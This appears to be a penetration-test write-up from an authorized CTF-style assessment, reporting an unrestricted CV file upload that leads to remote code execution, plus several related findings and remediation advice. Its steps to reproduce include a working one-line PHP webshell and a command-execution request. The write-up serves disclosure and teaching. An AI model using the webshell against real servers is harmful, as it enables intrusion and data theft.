# Unrestricted File Upload Leading to Remote Code Execution

**Target type:** Candidate-facing web application assessment portal (private CTF-style environment — identifying details redacted)
**Role:** Independent assessor, written authorization granted
**Tools used:** Burp Suite (Community Edition), OpenVPN, PowerShell (`Invoke-WebRequest`)
**Methodology:** Manual testing — reconnaissance, then authentication, authorization, file handling, and API security, one feature at a time

> This write-up is based on a private technical assessment I completed as part of an application process. The target name, flag values, and other identifying details have been redacted or replaced, since the environment and its contents were confidential. The vulnerability classes, methodology, and remediation below are unchanged and reflect the actual work.

## Summary

While testing a web application's CV/resume upload feature, I found that the server accepted any file type with no validation on extension, MIME type, or file content. Uploading a PHP file let the server store and execute it, giving me remote code execution as the web server user (`www-data`). From there I was able to run arbitrary OS commands, read restricted files, and enumerate the server environment.

I also found, while exploring the same upload directory, a PHP reverse shell that had evidently been placed there by another party — confirming the vulnerability was independently discovered and actively exploited by someone else in the same environment, not just a theoretical risk.

**Risk rating:** High

## Vulnerability

The CV upload endpoint accepted file uploads with no server-side type checking. The client could set any filename and extension, and the server stored the file as-is in a publicly accessible, web-executable directory.

## Steps to Reproduce

1. Register an account and log in.
2. Navigate to the profile page and locate the CV upload feature.
3. Create a minimal PHP webshell:
   ```php
   <?php system($_GET["cmd"]); ?>
   ```
4. Upload it through the CV upload field. The server accepts it and returns a stored path, e.g.:
   ```json
   {"filename":"cv-view/<hash>.php","message":"CV uploaded"}
   ```
5. Request the stored file directly with a command parameter:
   ```
   GET /cv-view/<hash>.php?cmd=whoami
   ```
   Response: `www-data`
6. From here, arbitrary commands can be executed — directory listings, reading environment variables, and reading restricted files on the server were all possible.

## Post-Exploitation Observations

- Server environment details (web server version, PHP version, web root path, running user) were readable via the webshell.
- Server configuration files were also readable, along with evidence of an internal-only API endpoint on the local network — indicating the web app was not isolated from other internal services.
- A file left by another party in the same upload directory turned out, on inspection, to be a disguised PHP reverse shell — meaning the same flaw had already been found and used by someone else in this shared environment.

## Business Impact

Unrestricted file upload leading to RCE is one of the most severe web vulnerabilities possible. An attacker can:
- Execute arbitrary commands as the web server user
- Read any file accessible to that process, including source code, configuration, and secrets
- Pivot to other internal services reachable from the server
- Use the compromised server as a foothold into the broader network

In this case, the fact that *another* party's malicious upload was sitting in the same public directory shows the real-world consequence isn't hypothetical — in a shared or production environment, one user's exploitation of this flaw directly endangers every other user.

## Remediation

- **Allowlist file types server-side** — validate against actual file content (magic bytes), not just the client-supplied extension or MIME type.
- **Store uploads outside the web root** so they can never be directly requested or executed via HTTP.
- **Serve files through a controlled download endpoint** that forces a `Content-Disposition: attachment` response and checks the requester owns the file, rather than exposing a static, guessable path.
- **Run uploaded-file handling in a sandboxed or restricted context**, so even a successful malicious upload can't execute with meaningful privileges.

---

## Related Findings From the Same Assessment

A few other issues worth noting briefly, found during the same engagement:

- **Sensitive data in error responses:** Attempting to register with an already-used email returned a full debug object containing the existing user's record, including their bcrypt password hash. Root cause was debug mode left enabled in a production-facing environment. *Fix: never return internal debug data in API error responses; use generic error messages for enumeration-sensitive actions like registration.*
- **Insecure direct object reference on uploaded files:** Uploaded files were served from a public, unauthenticated path with only an MD5 hash for obscurity — no ownership check. Combined with the upload flaw above, this meant malicious files uploaded by one user were directly reachable and executable by anyone who found or guessed the path. *Fix: authenticate and check file ownership before serving any uploaded file.*
- **Over-broad data exposure on a leaderboard:** An authenticated leaderboard endpoint returned full per-user scoring detail for every user, not just the requester. *Fix: only return another user's rank/anonymized identifier, not their full detailed breakdown.*
- **Admin endpoints enumerable via client bundle:** Admin API paths were correctly access-controlled, but were discoverable by reading the compiled frontend JavaScript. *Fix: avoid embedding internal-only route names in client-shipped code; return a generic 404 (not a distinguishing error) for unauthorized admin requests.*

## Takeaways

The most severe issue (unrestricted upload → RCE) is also the simplest to prevent, which is a good reminder that basic server-side validation is non-negotiable even when a feature seems low-risk ("it's just a CV upload"). The secondary findings reinforced a pattern I keep seeing: trusting client-supplied data (filenames, MIME types, frontend route lists) without server-side verification is where most of these chains start.
